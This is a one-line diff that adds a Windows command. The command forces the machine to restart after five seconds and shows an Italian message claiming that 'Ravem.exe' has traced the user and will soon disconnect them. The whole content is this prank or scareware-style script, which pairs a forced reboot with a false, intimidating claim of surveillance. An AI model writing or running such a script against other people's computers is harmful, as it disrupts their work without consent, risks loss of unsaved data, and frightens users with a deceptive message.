@@ -1,0 +1,1 @@
+shutdown -r -c "Ravem.exe ti ha rintracciato verrai presto disconnesso" -t 5
